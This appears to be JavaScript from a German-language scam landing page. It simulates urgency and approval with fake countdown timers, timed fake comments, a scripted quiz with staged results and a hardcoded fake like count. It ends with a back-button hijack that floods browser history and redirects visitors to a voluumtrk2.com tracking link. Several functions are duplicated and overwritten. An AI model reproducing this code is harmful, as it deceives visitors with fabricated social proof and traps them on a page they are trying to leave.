function getURLParameter(name) {
    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
        results = regex.exec(location.search);
    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function startTimer(t, e) {
    function n() { o = t - ((Date.now() - i) / 1e3 | 0), a = o / 60 | 0, r = o % 60 | 0, a = 10 > a ? "0" + a : a, r = 10 > r ? "0" + r : r, e.textContent = a + ":" + r, 0 >= o && (i = Date.now() + 1e3) } var o, a, r, i = Date.now(); n(), setInterval(n, 1e3)
}

window.onload = function () {
    var t = 120, e = document.querySelector("#time"); startTimer(t, e)
};

function get_date(e) {
    return today = (now.getDate() - e) + ". " + monthNames[now.getMonth()] + " " + now.getFullYear()
}

var dayNames = new Array("Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"), monthNames = new Array("Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"), now = new Date, today = now.getDate() + ". " + monthNames[now.getMonth()] + " " + now.getFullYear();

$(document).ready(function () {
    setTimeout(function () {
        $("#comment1").fadeIn()
    }, 1e4), setTimeout(function () {
        $("#comment2").fadeIn()
    }, 12e3), setTimeout(function () {
        $("#comment3").fadeIn()
    }, 13e3), setTimeout(function () {
        $("#comment4").fadeIn()
    }, 18e3), setTimeout(function () {
        $("#comment5").fadeIn()
    }, 2e4), setTimeout(function () {
        $("#comment6").fadeIn()
    }, 22e3), $(".bq1").click(function () {
        $("#q1").fadeOut(0), $("#q2").fadeIn(500)
    }), $(".bq2").click(function () {
        $("#q2").fadeOut(0), $("#q3").fadeIn(500)
    }), $(".bq3").click(function () {
        $("#q3").fadeOut(0), $("#q4").fadeIn(500)
    }), $(".bq4").click(function () {
        $("#content1").fadeOut(0), $("#content2").fadeIn(), setTimeout(function () {
            $("#result1").fadeIn(1e3)
        }, 3e3), setTimeout(function () {
            $("#result2").fadeIn(1e3)
        }, 4500), setTimeout(function () {
            $("#result3").fadeIn(1e3)
        }, 6e3), setTimeout(function () {
            $("#content2").fadeOut()
        }, 7500), setTimeout(function () {
            $("#content3").fadeIn()
        }, 7500)
    })
});

function startTimer(t, e) {
    function n() {
        o = t - ((Date.now() - i) / 1e3 | 0), a = o / 60 | 0, r = o % 60 | 0, a = 10 > a ? "0" + a : a, r = 10 > r ? "0" + r : r, e.textContent = a + ":" + r, 0 >= o && (i = Date.now() + 1e3)
    } var o, a, r, i = Date.now(); n(), setInterval(n, 1e3)
}

window.onload = function () {
    var t = 120, e = document.querySelector("#time"); startTimer(t, e)
};

function startTimer(t, e) {
    var n, o = t; setInterval(function () {
        n = parseInt(o % 60, 10), n = 10 > n ? "0" + n : n, e.textContent = n, --o < 0 && (e.textContent = "Wenige")
    }, 6e3)
}

window.onload = function () {
    var t = 20, e = document.querySelector("#time"); startTimer(t, e)
};

function total_likes() { 'Ihnen und <span style="color:#3b5998;">12.068</span> gefällt das' == document.getElementById("total_likes").innerHTML ? (document.getElementById("total_likes").innerHTML = '<span style="color:#3b5998;">12.068</span> gefällt das', document.getElementById("liked").innerHTML = "Like") : (document.getElementById("total_likes").innerHTML = 'Ihnen und <span style="color:#3b5998;">12.068</span> gefällt das', document.getElementById("liked").innerHTML = "Unlike") }

!function () {
    var t;
    try {
        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
        onpopstate = function (t) {
            t.state && location.replace("http://w7wpo.voluumtrk2.com/click")
        }
    } catch (o) { }
}();
bajb_backdetect.OnBack = function () {
    window.history.back = function () {
        document.location = 'http://w7wpo.voluumtrk2.com/click'
    }
}
